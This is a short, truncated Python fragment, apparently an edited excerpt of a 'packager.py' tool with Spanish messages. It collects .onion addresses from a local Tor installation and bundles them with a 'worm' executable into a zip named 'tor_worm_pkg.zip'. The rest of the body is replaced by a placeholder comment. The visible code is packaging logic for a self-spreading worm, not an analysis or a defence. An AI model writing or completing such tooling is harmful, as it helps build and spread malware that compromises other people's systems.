import os
import sys
import json
import zipfile
import tempfile
import shutil

try:
    from onion_harvester import harvest_all
    from tor_locator import find_tor_install
except ImportError as e:
    print(f"[!] Error importando modulos: {e}")
    sys.exit(1)

def build_package(tor_root: str, worm_exe: str, output: str = "tor_worm_pkg.zip"):
    print("[*] Recolectando onions...")
    harvest = harvest_all(tor_root)
    onions = sorted(harvest["onions"])
    print(f"[+] {len(onions)} onions en {len(harvest['sources'])} fuentes")

    # ... (deja el resto de tu packager.py exactamente como estaba)